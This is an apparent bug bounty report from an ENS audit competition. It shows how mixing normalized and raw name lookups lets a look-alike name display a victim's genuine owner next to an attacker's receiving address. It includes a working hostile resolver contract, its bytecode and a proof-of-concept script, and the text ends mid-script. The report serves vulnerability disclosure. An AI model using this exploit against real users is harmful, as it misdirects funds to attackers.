# 93010 w a critical profile page reads ownership and records from two different names so a look alike name displays an attacker controlled receiving address

**Submitted on Sep 13th 2026 at 20:37:22 UTC by @Naveen0x for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93010
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

Everything needed to reproduce this is in the report itself: the resolver source, the full PoC script, the contract addresses it uses and the output I got. There are no attachments.

## Summary

The Manager profile route resolves a name's ownership through ENSIP-15 normalization, but resolves its records straight from the raw URL parameter. Those two reads can land on two different ENS nodes.

An attacker registers a look-alike twin of a victim's name, for example the victim's label with a soft hyphen appended, and points it at a wildcard resolver they control. The twin's profile page then shows the victim's genuine owner address, genuine registration date and genuine expiry, sitting next to an ETH receiving address that the attacker chose. That address is rendered under the heading "Main receiving address" with a copy button attached to it.

Nobody has to connect a wallet or approve anything. Someone who opens the link to check where to pay a name copies the attacker's address.

## Affected

Route: `/$name` (the profile page), and `/p/$name`, which redirects to it unchanged

Primary defect: `apps/manager/src/features/profile/service/profileRecords.ts:122-132`

Entry point: `apps/manager/src/routes/$name/index.tsx:50-56`

Commit: `1c9b47f18fcddd2e864dfe385c4171061c9811ae` (branch `audit-comp-ready`)

## Impact

A user who opens an attacker-supplied profile link sees a page that looks completely legitimate. The owner address is real, the registration and expiry dates are real, and the name printed in the heading and the browser tab reads exactly like the victim's name, because the soft hyphen renders as nothing. The only false value on the page is the one the user came for: the receiving address.

This is direct funds misdirection against a third party who never interacts with a contract. The attacker only needs to get the link in front of them, which is how profile links normally circulate: forum posts, DMs, invoices, group chats.

The PoC below produces the resolution itself. For one name, on one profile page, the ownership read and the record read land on two different nodes, and the record read returns the address the attacker planted. The final hop, React painting that value into the copy button, is traced in source rather than executed in a browser, and I flag that plainly below.

## Root cause

`apps/manager/src/routes/$name/index.tsx:50-56` fires both reads with the same raw route parameter:

```ts
loader: async ({ params: { name }, context: { queryClient } }) => {
  const [profileRecords, ownerData] = await Promise.all([
    queryClient.ensureQueryData(profileRecordsQuery(name)),   // raw
    queryClient.fetchQuery(profileOwnerQuery(name)),          // normalized downstream
  ])
```

The two code paths then disagree about what that parameter means.

The owner read normalizes. `profileOwner.ts:25` calls `normalizeEthName(params.name)` and `profileOwner.ts:56` passes the normalized string into `getOwner`. `normalizeEthName` is `profileName.ts:14-21`, and the normalization itself is viem's `normalize` at `profileName.ts:18`.

Expiry normalizes too, through `normalizeEth2LdName(name)` at `profileExpiry.ts:77`, used at `:94` and `:106`.

Registration normalizes as well, through `normalizeEth2LdName(name)` at `profileRegistration.ts:66`, used at `:80` for v1 names and at `:117` (`label: ethName.label`) for v2 names, which is the path a freshly registered twin takes.

Text and coin records do not normalize. `profileRecords.ts:122-132` calls `getRecords(client, { name, ... })` with the raw parameter and no `resolver` key in the options object.

With no resolver override, ensjs routes the read through the UniversalResolver, and it DNS-encodes the raw name to do so:

```ts
// @ensdomains/ensjs 5.0.0-alpha.1, src/actions/public/resolveNameData.ts:70 and :93
const nameWithSizedLabels = getNameWithSizedLabels(name)   // raw, never normalized
...
args: [toHex(packetToBytes(nameWithSizedLabels)), multicallData]
```

Resolver discovery therefore walks the impostor node, which the attacker owns.

One subtlety is worth stating, because it looks like a mitigation and is not. Inside a single `getRecords` batch, ensjs does normalize address records: `src/utils/coders/getAddress.ts:121-124` for coinType 60 and `:133-136` for other coins both call `namehash(normalize(name))`, while text and contenthash records use the raw name (`getText.ts:49` and `getContentHash.ts:37` are `namehash(name)`). So the inner `addr` calldata does carry the genuine node. That does not help. An ENSIP-10 extended resolver is invoked as `resolve(dnsEncodedName, innerCalldata)` and is free to ignore the node inside `innerCalldata` completely. The normalized node never constrains the answer. The resolver I wrote for this does exactly that, in about twenty lines of Solidity, and its full source is below.

The poisoned value then lands on the one field that matters:

* `ProfileView.tsx:93-95` takes records from `profileRecordsQuery(name)` (the raw read) and `ProfileView.tsx:99-101` takes the owner from `profileOwnerQuery(name)` (the normalized read). Both receive the raw route param from `routes/$name/index.tsx:165-173`.
* `getMainAddressCandidate` at `ProfileView.helpers.ts:229-237` promotes coinType 60 (`ETH_COIN_TYPE = 60`, `ProfileView.helpers.ts:16`) to the primary receiving address:

```ts
// ProfileView.helpers.ts:234-235
addresses.find((address) => address.coinType === ETH_COIN_TYPE) ?? addresses[0]
```

* `ProfileAddressesSection.tsx:159` calls `getMainReceivingAddress` (`ProfileView.helpers.ts:239-244`), `:171-178` renders it under "Main receiving address", and `:90-94` wraps it in a `CopyableButton` whose `value={address.value}` is what a click puts on the clipboard.

None of this depends on indexer state. `profileRecords.ts:116-120` unions coinType 60 into the request unconditionally through `alwaysProbeAddressRecords = ['60']` (`apps/manager/src/features/profile/data/records/utils.ts:42`), whatever the indexer returns.

The app's own share link preserves the raw form: `ProfileView.tsx:60-65` builds `/p/${name}`, and `routes/p/$name/index.tsx:9` redirects that to `/$name` with the parameter unchanged.

## Why the route's existing checks do not stop this

The route is not unguarded, so here is what it actually checks and why each check passes a twin.

The param parser at `routes/$name/route.tsx:3-19` is a length and dot check:

```ts
parse: ({ name }) => {
  if (name.length < 3 || !name.includes('.')) {
    throw new Error('Invalid ENS name')
  }
```

A twin label passes trivially. It is longer than the genuine label and it contains a dot.

`parseName` at `routes/$name/index.tsx:58` comes from `apps/manager/src/features/register-v2/utils/name-parser.ts:33-82`. Its character filter is `INVALID_LABEL_CHARS` at `name-parser.ts:11`:

```ts
const INVALID_LABEL_CHARS = /[&*@#$%^()[\]{}|\\:;"'<>?,=+~`!]/
```

That is an ASCII punctuation blocklist, applied at `name-parser.ts:73-75`. It rejects no non-ASCII character at all, and `name-parser.ts:46` lowercases the string before testing, so it cannot even see a case difference. `parseName` also rejects whitespace (`:49-51`) and consecutive dots (`:54-56`). A soft hyphen, a zero-width space, a fullwidth letter and a capital letter all pass.

The TLD and DNSSEC gate at `routes/$name/index.tsx:58-74` computes `isEth` and only consults DNSSEC when the TLD is not `eth`. `parseName` on `victim<U+00AD>.eth` returns `tld: 'eth'`, so `isEth` is true and the whole DNSSEC branch at `:64-74` is skipped.

`classifyMissingName` and the registrable redirect at `routes/$name/index.tsx:76-93` only run when `ownerData` is null. Here `ownerData` is not null, because the normalized read finds the victim's real ownership record, so the loader falls through and renders the profile.

So there is no normalization, no canonicalizing redirect and no resolver-consistency check anywhere on this route.

The Explorer app already does this correctly, in the same monorepo. It gates the equivalent page on `isValidEnsName(name)` at `apps/portal/src/routes/$name/index.tsx:442` and returns `<InvalidNameMessage title="Invalid name" />` at `:458-460`. `isValidEnsName` (`apps/portal/src/utils/token/isNormalized.ts:39-57`) is a real ENSIP-15 check: `:44-56` requires every label either to satisfy `ens_normalize(label) === label` (`isNormalized.ts:16-22`) and `ens_split` without error, or to be an encoded labelhash `[64 hex]` (`:45-47`, `isNormalized.ts:11-14`). I copied that function out of the file and ran it against the repo's own `@adraffy/ens-normalize`: `victim.eth` returns true, while `Victim.eth`, `VICTIM.ETH`, `victim<U+00AD>.eth` and the fullwidth, circled and Kelvin variants listed in the output below all return false.

## Proof of Concept

## Proof of concept

### What you need

A local anvil fork of Sepolia, and Node. The script runs from inside `apps/manager/` so that the repository's own pinned `viem` and `@ensdomains/ensjs` (5.0.0-alpha.1) resolve, which matters here: the point is that these are the versions the app ships with.

```
anvil --fork-url <sepolia-rpc> --chain-id 11155111
```

Then save the script below as `poc.mjs` in `apps/manager/` and run `node poc.mjs`. The RPC defaults to `http://127.0.0.1:8545` and can be overridden with `RPC_URL`.

### Contracts and accounts the script uses

These are the ENS v2 Sepolia deployment addresses as pinned by `@ensdomains/ensjs` in this repository, so nothing below is a stand-in except the registrar's own test payment token:

ETHRegistrar: `0xa88553F454b77203B0D036A05c894d555EAAa2Cc`

Payment token (MockUSDC): `0x768F42455A2D082E23ceeF7d51e5787C82d67a39`

Stock public resolver, used for the genuine name: `0x640294a2b2d87e7f522db3e3e3e876764bce170d`

Attacker: anvil default account 0, `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`

Victim: account 1 from the standard anvil mnemonic, `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`

The address the hostile resolver hands back is `0x00000000000000000000000000000000DeaDBeef`, picked so it is obvious in the output which value came from where.

One environment quirk worth knowing before you run it: anvil forks of Sepolia inherit EIP-7702 delegations that others have squatted on the standard test accounts, and those revert inside `onERC1155Received` during registration. The script clears them with `anvil_setCode` before each registration. If you adapt the script, keep that.

### The hostile resolver

This is the contract the attacker deploys and points the twin at. It is an ENSIP-10 extended resolver that answers for any node it is asked about, which is what makes the inner normalized `addr` calldata irrelevant. I compiled it with solc 0.8.28, and the deployed bytecode is embedded in the script, so you do not need solc to reproduce.

```solidity
contract EvilWildcardResolver {
  address public constant ATTACKER = 0x00000000000000000000000000000000DeaDBeef;

  // ENSIP-10 extended resolver: answers for ANY node it is asked about
  function resolve(bytes calldata, bytes calldata data) external pure returns (bytes memory) {
    bytes4 sel = bytes4(data[0:4]);
    if (sel == 0x3b3b57de) return abi.encode(ATTACKER);                       // addr(bytes32)
    if (sel == 0xf1cb7e06) return abi.encode(abi.encodePacked(ATTACKER));     // addr(bytes32,uint256)
    if (sel == 0x59d1d43c) return abi.encode(string("evil-text"));            // text(bytes32,string)
    if (sel == 0xbc1c58d1) return abi.encode(bytes(""));                      // contenthash(bytes32)
    return "";
  }

  function addr(bytes32) external pure returns (address) { return ATTACKER; }
  function addr(bytes32, uint256) external pure returns (bytes memory) { return abi.encodePacked(ATTACKER); }
  function text(bytes32, string calldata) external pure returns (string memory) { return "evil-text"; }
  function contenthash(bytes32) external pure returns (bytes memory) { return ""; }

  function supportsInterface(bytes4 id) external pure returns (bool) {
    return id == 0x01ffc9a7 || id == 0x9061b923 || id == 0x3b3b57de
        || id == 0xf1cb7e06 || id == 0x59d1d43c || id == 0xbc1c58d1;
  }
}
```

### The script

Copy this whole block to `apps/manager/poc.mjs`. One warning about copying it: the `IMPOSTOR_LABEL` assignment and the soft hyphen, zero width, word joiner, BOM and variation selector entries in `DIVERGENCE_CASES` contain literal invisible characters. They have to survive the copy, or the script will register the same label twice and the second registration will revert. If your editor strips them, rebuild those strings with explicit escapes, for example `` `${BASE}\u00AD` ``.

```js
/**
 * PoC — ENS Manager renders the genuine owner of a name beside an
 *       attacker-controlled receiving address.
 *
 * SETUP
 *   1. anvil --fork-url <sepolia-rpc> --chain-id 11155111
 *   2. Place this file in apps/manager/ (so the repo's pinned viem and
 *      @ensdomains/ensjs resolve), or symlink apps/manager/node_modules next to it.
 *   3. node poc.mjs
 *
 * WHAT IT DOES
 *   [0] prints the raw-vs-normalized divergence table, to show the split does
 *       not depend on any particular "deceptive" character class
 *   [1] deploys a hostile ENSIP-10 (wildcard) resolver that answers every addr()
 *       query with 0x...DeaDBeef, regardless of the node in the inner calldata
 *   [2] registers  <base>.eth       to the VICTIM   (normal resolver)
 *       registers  <base>­.eth to the ATTACKER (hostile resolver)
 *       U+00AD SOFT HYPHEN renders as nothing, so the two are visually identical
 *   [3] performs the two reads the Manager profile route performs:
 *         owner   -> normalizeEthName() then getOwner()      [ENSIP-15 normalized]
 *                    profileOwner.ts:25 and :56
 *         records -> getRecords(client, { name })            [raw route param]
 *                    profileRecords.ts:122-132
 *   [4] repeats the record read with the application's EXACT option object and
 *       record key unions from profileRecords.ts:109-132, then applies the
 *       primary-address selection from ProfileView.helpers.ts:229-237
 *
 * WHAT IT DOES NOT DO
 *   It does not boot the Vite app or import getProfileRecords() itself: that
 *   function first calls the GraphQL indexer (profileRecords.ts:94-97), which is
 *   not part of the in-scope repository and is not available offline. Step [4]
 *   reproduces the ensjs call that function makes, argument for argument. The
 *   indexer leg can only ADD record keys to the two unions; it cannot remove
 *   coinType 60, which alwaysProbeAddressRecords pins unconditionally
 *   (data/records/utils.ts:42, profileRecords.ts:116-120).
 *
 * EXPECTED OUTPUT
 *   displayed owner   : <victim EOA>        (the genuine owner)
 *   displayed ETH addr: 0x...DeaDBeef       (the attacker's address)
 */
import {
  createPublicClient, createWalletClient, http, encodeFunctionData, parseAbi, labelhash, toHex,
} from 'viem'
import { privateKeyToAccount, mnemonicToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { namehash, normalize, packetToBytes } from 'viem/ens'
import { coinTypeToNameMap } from '@ensdomains/address-encoder'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getRecords } from '@ensdomains/ensjs/public'
import { getOwner as getOwnerV2 } from '@ensdomains/ensjs/public/v2'
import { getCoderFromCoin } from '@ensdomains/ensjs/utils'

const RPC = process.env.RPC_URL ?? 'http://127.0.0.1:8545'
const chain = extendChainWithEns(sepolia)
const pub = createPublicClient({ chain, transport: http(RPC) })

// anvil default account 0, and account 1 from the standard test mnemonic
const attacker = privateKeyToAccount('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80')
const victim = mnemonicToAccount('test test test test test test test test test test test junk', { addressIndex: 1 })

// ENS v2 Sepolia deployment (as pinned by @ensdomains/ensjs in this repo)
const REG = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'   // ETHRegistrar
const USDC = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39'  // MockUSDC (payment token)
const GOOD_RESOLVER = '0x640294a2b2d87e7f522db3e3e3e876764bce170d'
const ZERO = '0x0000000000000000000000000000000000000000'
const ZH = `0x${'00'.repeat(32)}`

const regAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256)',
])
const tokAbi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
])

/**
 * EvilWildcardResolver, compiled with solc 0.8.28. Source:
 *
 *   contract EvilWildcardResolver {
 *     address public constant ATTACKER = 0x00000000000000000000000000000000DeaDBeef;
 *     // ENSIP-10 extended resolver: answers for ANY node it is asked about
 *     function resolve(bytes calldata, bytes calldata data) external pure returns (bytes memory) {
 *       bytes4 sel = bytes4(data[0:4]);
 *       if (sel == 0x3b3b57de) return abi.encode(ATTACKER);                       // addr(bytes32)
 *       if (sel == 0xf1cb7e06) return abi.encode(abi.encodePacked(ATTACKER));     // addr(bytes32,uint256)
 *       if (sel == 0x59d1d43c) return abi.encode(string("evil-text"));            // text(bytes32,string)
 *       if (sel == 0xbc1c58d1) return abi.encode(bytes(""));                      // contenthash(bytes32)
 *       return "";
 *     }
 *     function addr(bytes32) external pure returns (address) { return ATTACKER; }
 *     function addr(bytes32, uint256) external pure returns (bytes memory) { return abi.encodePacked(ATTACKER); }
 *     function text(bytes32, string calldata) external pure returns (string memory) { return "evil-text"; }
 *     function contenthash(bytes32) external pure returns (bytes memory) { return ""; }
 *     function supportsInterface(bytes4 id) external pure returns (bool) {
 *       return id == 0x01ffc9a7 || id == 0x9061b923 || id == 0x3b3b57de
 *           || id == 0xf1cb7e06 || id == 0x59d1d43c || id == 0xbc1c58d1;
 *     }
 *   }
 */
const EVIL_BYTECODE =
  '0x' +
  '6080604052348015600e575f5ffd5b50610b368061001c5f395ff3fe608060405234801561000f575f5ffd5b506004361061' +
  '007b575f3560e01c80639061b923116100595780639061b9231461010f578063a55a15031461013f578063bc1c58d1146101' +
  '5d578063f1cb7e061461018d5761007b565b806301ffc9a71461007f5780633b3b57de146100af57806359d1d43c146100df' +
  '575b5f5ffd5b610099600480360381019061009491906105d3565b6101bd565b6040516100a69190610618565b6040518091' +
  '0390f35b6100c960048036038101906100c49190610664565b6102de565b6040516100d691906106ce565b60405180910390' +
  'f35b6100f960048036038101906100f49190610748565b6102eb565b6040516101069190610815565b60405180910390f35b' +
  '6101296004803603810190610124919061088a565b61032c565b604051610136919061095a565b60405180910390f35b6101' +
  '47610528565b60405161015491906106ce565b60405180910390f35b61017760048036038101906101729190610664565b61' +
  '0530565b604051610184919061095a565b60405180910390f35b6101a760048036038101906101a291906109ad565b610548' +
  '565b6040516101b4919061095a565b60405180910390f35b5f6301ffc9a760e01b827bffffffffffffffffffffffffffffff' +
  'ffffffffffffffffffffffffff191614806102175750639061b92360e01b827bffffffffffffffffffffffffffffffffffff' +
  'ffffffffffffffffffff1916145b806102475750633b3b57de60e01b827bffffffffffffffffffffffffffffffffffffffff' +
  'ffffffffffffffff1916145b80610277575063f1cb7e0660e01b827bffffffffffffffffffffffffffffffffffffffffffff' +
  'ffffffffffff1916145b806102a757506359d1d43c60e01b827bffffffffffffffffffffffffffffffffffffffffffffffff' +
  'ffffffff1916145b806102d7575063bc1c58d160e01b827bffffffffffffffffffffffffffffffffffffffffffffffffffff' +
  'ffff1916145b9050919050565b5f63deadbeef9050919050565b60606040518060400160405280600981526020017f657669' +
  '6c2d74657874000000000000000000000000000000000000000000000081525090509392505050565b60605f83835f906004' +
  '92610342939291906109f3565b9061034d9190610a43565b9050633b3b57de60e01b817bffffffffffffffffffffffffffff' +
  'ffffffffffffffffffffffffffff1916036103a85763deadbeef60405160200161039191906106ce565b6040516020818303' +
  '03815290604052915050610520565b63f1cb7e0660e01b817bffffffffffffffffffffffffffffffffffffffffffffffffff' +
  'ffffff1916036104205763deadbeef6040516020016103ea9190610ae6565b60405160208183030381529060405260405160' +
  '2001610409919061095a565b604051602081830303815290604052915050610520565b6359d1d43c60e01b817bffffffffff' +
  'ffffffffffffffffffffffffffffffffffffffffffffff1916036104aa576040518060400160405280600981526020017f65' +
  '76696c2d7465787400000000000000000000000000000000000000000000008152506040516020016104939190610815565b' +
  '604051602081830303815290604052915050610520565b63bc1c58d160e01b817bffffffffffffffffffffffffffffffffff' +
  'ffffffffffffffffffffff19160361050d5760405180602001604052805f8152506040516020016104f6919061095a565b60' +
  '4051602081830303815290604052915050610520565b60405180602001604052805f8152509150505b949350505050565b63' +
  'deadbeef81565b606060405180602001604052805f8152509050919050565b606063deadbeef60405160200161055f919061' +
  '0ae6565b604051602081830303815290604052905092915050565b5f5ffd5b5f5ffd5b5f7fffffffff000000000000000000' +
  '0000000000000000000000000000000000000082169050919050565b6105b28161057e565b81146105bc575f5ffd5b50565b' +
  '5f813590506105cd816105a9565b92915050565b5f602082840312156105e8576105e7610576565b5b5f6105f58482850161' +
  '05bf565b91505092915050565b5f8115159050919050565b610612816105fe565b82525050565b5f60208201905061062b5f' +
  '830184610609565b92915050565b5f819050919050565b61064381610631565b811461064d575f5ffd5b50565b5f81359050' +
  '61065e8161063a565b92915050565b5f6020828403121561067957610678610576565b5b5f61068684828501610650565b91' +
  '505092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6106b88261068f565b90' +
  '50919050565b6106c8816106ae565b82525050565b5f6020820190506106e15f8301846106bf565b92915050565b5f5ffd5b' +
  '5f5ffd5b5f5ffd5b5f5f83601f840112610708576107076106e7565b5b8235905067ffffffffffffffff8111156107255761' +
  '07246106eb565b5b602083019150836001820283011115610741576107406106ef565b5b9250929050565b5f5f5f60408486' +
  '03121561075f5761075e610576565b5b5f61076c86828701610650565b935050602084013567ffffffffffffffff81111561' +
  '078d5761078c61057a565b5b610799868287016106f3565b92509250509250925092565b5f81519050919050565b5f828252' +
  '60208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f6107e7826107a5' +
  '565b6107f181856107af565b93506108018185602086016107bf565b61080a816107cd565b840191505092915050565b5f60' +
  '20820190508181035f83015261082d81846107dd565b905092915050565b5f5f83601f84011261084a576108496106e7565b' +
  '5b8235905067ffffffffffffffff811115610867576108666106eb565b5b6020830191508360018202830111156108835761' +
  '08826106ef565b5b9250929050565b5f5f5f5f604085870312156108a2576108a1610576565b5b5f85013567ffffffffffff' +
  'ffff8111156108bf576108be61057a565b5b6108cb87828801610835565b9450945050602085013567ffffffffffffffff81' +
  '11156108ee576108ed61057a565b5b6108fa87828801610835565b925092505092959194509250565b5f8151905091905056' +
  '5b5f82825260208201905092915050565b5f61092c82610908565b6109368185610912565b93506109468185602086016107' +
  'bf565b61094f816107cd565b840191505092915050565b5f6020820190508181035f8301526109728184610922565b905092' +
  '915050565b5f819050919050565b61098c8161097a565b8114610996575f5ffd5b50565b5f813590506109a781610983565b' +
  '92915050565b5f5f604083850312156109c3576109c2610576565b5b5f6109d085828601610650565b92505060206109e185' +
  '828601610999565b9150509250929050565b5f5ffd5b5f5ffd5b5f5f85851115610a0657610a056109eb565b5b8386111561' +
  '0a1757610a166109ef565b5b6001850283019150848603905094509492505050565b5f82905092915050565b5f82821b9050' +
  '92915050565b5f610a4e8383610a2d565b82610a59813561057e565b92506004821015610a9957610a947fffffffff000000' +
  '0000000000000000000000000000000000000000000000000083600403600802610a37565b831692505b505092915050565b' +
  '5f8160601b9050919050565b5f610ab782610aa1565b9050919050565b5f610ac882610aad565b9050919050565b610ae061' +
  '0adb826106ae565b610abe565b82525050565b5f610af18284610acf565b6014820191508190509291505056fea264697066' +
  '735822122098d90ab7be7339bce0309db67dbd2c80655826008d7f077c86003c6205adcae164736f6c634300081c0033'

const rpc = (method, params) =>
  fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  }).then((r) => r.json())

const wallet = (acct) => createWalletClient({ account: acct, chain, transport: http(RPC) })

const send = async (wc, to, data) => {
  const hash = await wc.sendTransaction({ to, data })
  const receipt = await pub.waitForTransactionReceipt({ hash })
  if (receipt.status !== 'success') throw new Error(`tx reverted: ${hash}`)
  return receipt
}

/** Register `label` from the owner's own account (the registrar pulls payment from msg.sender). */
async function register(ownerAcct, label, resolver) {
  const wc = wallet(ownerAcct)
  const owner = ownerAcct.address
  const secret = `0x${'11'.repeat(32)}`
  const duration = 31536000n

  // Anvil forks of Sepolia inherit EIP-7702 delegations squatted on the test
  // accounts; those revert inside onERC1155Received. Clear them first.
  await rpc('anvil_setCode', [owner, '0x'])
  await rpc('anvil_setBalance', [owner, `0x${(10n ** 20n).toString(16)}`])

  await send(wallet(attacker), USDC, encodeFunctionData({ abi: tokAbi, functionName: 'mint', args: [owner, 10_000_000_000n] }))
  const commitment = await pub.readContract({
    address: REG, abi: regAbi, functionName: 'makeCommitment',
    args: [label, owner, secret, ZERO, resolver, duration, ZH],
  })
  await send(wc, REG, encodeFunctionData({ abi: regAbi, functionName: 'commit', args: [commitment] }))
  await rpc('evm_increaseTime', [90])
  await rpc('evm_mine', [])
  const [base, premium] = await pub.readContract({
    address: REG, abi: regAbi, functionName: 'getRegisterPrice', args: [label, duration, USDC],
  })
  await send(wc, USDC, encodeFunctionData({ abi: tokAbi, functionName: 'approve', args: [REG, (base + premium) * 2n] }))
  await send(wc, REG, encodeFunctionData({
    abi: regAbi, functionName: 'register',
    args: [label, owner, secret, ZERO, resolver, duration, USDC, ZH],
  }))
}

async function deployEvilResolver() {
  const hash = await wallet(attacker).deployContract({ abi: [], bytecode: EVIL_BYTECODE })
  const { contractAddress } = await pub.waitForTransactionReceipt({ hash })
  return contractAddress
}

// ---------------------------------------------------------------------------
// [0] The divergence property, with no chain access at all.
//
// The Manager route reads ownership through viem's `normalize` (ENSIP-15) and
// reads records through the raw route parameter, which ensjs DNS-encodes with
// `packetToBytes` (resolveNameData.ts:70 and :93). Any string where
// `normalize(raw) !== raw` therefore addresses two different nodes on one page.
// That property does not require a homoglyph, a bidirectional or other control
// character, or a leading/trailing dot: plain ASCII capitalisation is enough.
// ---------------------------------------------------------------------------
const DIVERGENCE_CASES = [
  ['ASCII capital',        'Victim.eth'],
  ['ASCII all-caps',       'VICTIM.ETH'],
  ['fullwidth  U+FF56',    'ｖictim.eth'],
  ['circled    U+24E5',    'ⓥictim.eth'],
  ['Kelvin     U+212A',    'Kelvin.eth'],
  ['soft hyphen U+00AD',   'victim­eth'.replace('eth', '.eth')],
  ['ZWSP       U+200B',    'victim​.eth'],
  ['word-joiner U+2060',   'victim⁠.eth'],
  ['BOM        U+FEFF',    'victim﻿.eth'],
  ['VS16       U+FE0F',    'victim️.eth'],
  ['ZWNJ       U+200C',    'victim‌.eth'],
  ['ZWJ        U+200D',    'victim‍.eth'],
  ['LRM        U+200E',    'victim‎.eth'],
  ['CGJ        U+034F',    'victim͏.eth'],
]

console.log('=== [0] raw vs normalize: which forms diverge, measured with the repo-pinned viem ===')
for (const [label, raw] of DIVERGENCE_CASES) {
  let norm
  try {
    norm = normalize(raw)
  } catch (e) {
    console.log(`  ${label.padEnd(20)} normalize THROWS -> not usable`)
    continue
  }
  const divergent = namehash(raw) !== namehash(norm)
  console.log(
    `  ${label.padEnd(20)} normalize -> ${JSON.stringify(norm).padEnd(14)}` +
    ` divergent: ${String(divergent).padEnd(5)} packetToBytes(raw) = ${toHex(packetToBytes(raw))}`,
  )
}
console.log()

const BASE = `nickdemo${Math.floor(Math.random() * 1e6)}`
const IMPOSTOR_LABEL = `${BASE}­`     // U+00AD SOFT HYPHEN — renders as nothing
const GENUINE = `${BASE}.eth`
const IMPOSTOR = `${IMPOSTOR_LABEL}.eth`

console.log('=== [1] the two names, and the hostile resolver ===')
console.log('  genuine  :', JSON.stringify(GENUINE), 'labelhash', labelhash(BASE))
console.log('  impostor :', JSON.stringify(IMPOSTOR), 'labelhash', labelhash(IMPOSTOR_LABEL))
console.log('  normalize(impostor) ->', JSON.stringify(normalize(IMPOSTOR)))

const EVIL = await deployEvilResolver()
console.log('  hostile resolver    :', EVIL)

console.log('\n=== [2] registrations, through the real ETHRegistrar on the fork ===')
console.log('  [2a] genuine  -> VICTIM,   resolver = the stock public resolver')
await register(victim, BASE, GOOD_RESOLVER)
console.log('  [2b] impostor -> ATTACKER, resolver = the hostile wildcard resolver')
console.log('       (register() takes the label string verbatim: no ENSIP-15 anywhere in that path)')
await register(attacker, IMPOSTOR_LABEL, EVIL)

console.log(`\n=== [3] the two reads the profile route performs for /${IMPOSTOR} ===`)

// routes/$name/index.tsx:50-56 hands the SAME raw param to both queries.

// owner leg: profileOwner.ts:25 normalizeEthName(params.name)
//            profileOwner.ts:56 ensjsv2_getOwner(client, { name: ethName.name })
const normalized = normalize(IMPOSTOR)
const owner = await getOwnerV2(pub, { name: normalized })
console.log(`  owner   (normalized -> "${normalized}"):`, JSON.stringify(owner))

// the impostor node itself, for contrast: the attacker owns it
const impostorOwner = await getOwnerV2(pub, { name: IMPOSTOR })
console.log(`  owner   (raw        -> ${JSON.stringify(IMPOSTOR)}):`, JSON.stringify(impostorOwner))

// records leg: profileRecords.ts:122-132 getRecords(client, { name, ... }) with the
// RAW param and NO `resolver` override, so the UniversalResolver discovers the
// resolver by DNS-encoding the raw name (ensjs resolveNameData.ts:70 and :93).
const records = await getRecords(pub, { name: IMPOSTOR, coins: ['ETH'], texts: ['avatar', 'url'] })
console.log('  records (raw):',
  JSON.stringify(records, (_k, v) => (typeof v === 'bigint' ? v.toString() : v), 2))

// ---------------------------------------------------------------------------
// [4] The same record read with the application's EXACT call shape.
//
// Step [3] used a hand-written getRecords call. This step reproduces
// apps/manager/src/features/profile/service/profileRecords.ts:109-132 argument
// for argument: the same `texts` union, the same `coins` union
// (alwaysProbeAddressRecords + addressRecords filtered by isSupportedCoinType),
// and the same options object { contentHash: true, abi: true,
// ignoreInvalidCoinTypes: true }. The text keys are copied verbatim from
// data/records/text.tsx:31-41 and :43-220; `addressRecords` is rebuilt from the
// same @ensdomains/address-encoder `coinTypeToNameMap` that
// data/records/address.tsx:5-11 builds it from.
//
// The indexer prefetch at profileRecords.ts:94-107 is not reproduced; it can
// only ADD keys to the two unions, and cannot remove coinType 60, which
// data/records/utils.ts:42 pins unconditionally.
// ---------------------------------------------------------------------------
const staticTextRecords = [
  'name', 'avatar', 'header', 'description', 'url', 'theme', 'language',
  'primary-contact', 'domains.ens.primary-contacts',
]
const textRecordKeys = [
  'com.twitter', 'org.telegram', 'xyz.farcaster', 'com.instagram', 'com.discord',
  'com.github', 'com.linkedin', 'com.youtube', 'com.reddit', 'com.tiktok',
  'com.twitch', 'com.mastodon', 'email', 'location', 'phone', 'mail', 'timezone',
]
const alwaysProbeAddressRecords = ['60']          // data/records/utils.ts:42

const unique = (values) => Array.from(new Set(values))
const isSupportedCoinType = (coinType) => {
  try { getCoderFromCoin(coinType); return true } catch { return false }
}

const appTexts = unique([...staticTextRecords, ...textRecordKeys])
const appCoins = unique([
  ...alwaysProbeAddressRecords.map(Number),
  ...Object.keys(coinTypeToNameMap).map(Number),
]).filter(isSupportedCoinType)

const appRecords = await getRecords(pub, {
  name: IMPOSTOR,
  texts: appTexts,
  coins: appCoins,
  contentHash: true,
  abi: true,
  ignoreInvalidCoinTypes: true,
})

// ProfileView.helpers.ts:16 ETH_COIN_TYPE = 60
// ProfileView.helpers.ts:229-237 getMainAddressCandidate
const ETH_COIN_TYPE = 60
const addressItems = appRecords.coins.filter((c) => c.value && c.value !== '0x')
const mainAddress =
  addressItems.find((a) => a.coinType === ETH_COIN_TYPE) ?? addressItems[0]

console.log('\n=== [4] app-shaped read (profileRecords.ts:122-132) ===')
console.log('  texts requested :', appTexts.length, ' coins requested:', appCoins.length)
console.log('  resolverAddress :', appRecords.resolverAddress)
console.log('  getMainReceivingAddress (ProfileView.helpers.ts:239-244) ->',
